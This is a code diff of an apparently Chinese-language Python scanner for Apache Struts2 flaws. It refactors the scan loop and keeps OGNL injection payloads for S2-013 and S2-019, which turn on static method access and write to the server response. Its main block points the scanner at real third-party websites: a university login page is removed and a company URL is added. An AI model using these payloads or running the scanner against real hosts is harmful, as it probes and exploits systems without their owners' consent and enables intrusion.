@@ -12,12 +12,6 @@ class Struts2:
         self.urls = urls
         self.url = ''
 
-    def init(self):
-        if not self.url.startswith('http://') and not self.url.startswith('https://'):
-            self.url = 'http://' + self.url
-        if not self.url.endswith('/'):
-            self.url += '/'
-
     def struts2_013(self):
         exp = '''?a=${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext
         @getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('webpath
@@ -54,7 +48,7 @@ class Struts2:
               "etWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29"
 
         try:
-            resp = requests.get(self.url + exp)
+            resp = requests.get(self.url+exp)
             if "webpath" in resp.text:
                 return "s2-019"
         except:
@@ -118,14 +112,16 @@ class Struts2:
         if r:
             print('存在漏洞: %s : %s' % (r, self.url))
 
-    def run(self):
-        if self.urls:
-            for url in self.urls:
-                self.url = url
-                self.init()
+    def scan(self):
+        print('struts2检测')
+        for url in self.urls:
+            self.url = url.split('?')[0]
+            if not self.url.startswith('http://') and not self.url.startswith('https://'):
+                self.url = 'http://' + self.url
+            if self.url.endswith('.action') or self.url.endswith('.do'):
                 self.struts2()
 
 
 if __name__ == '__main__':
-    Struts2(['http://jwgl.njnu.edu.cn/cas/login.action']).run()
+    Struts2(['http://tcnet.com.cn/Sec.action']).scan()
 
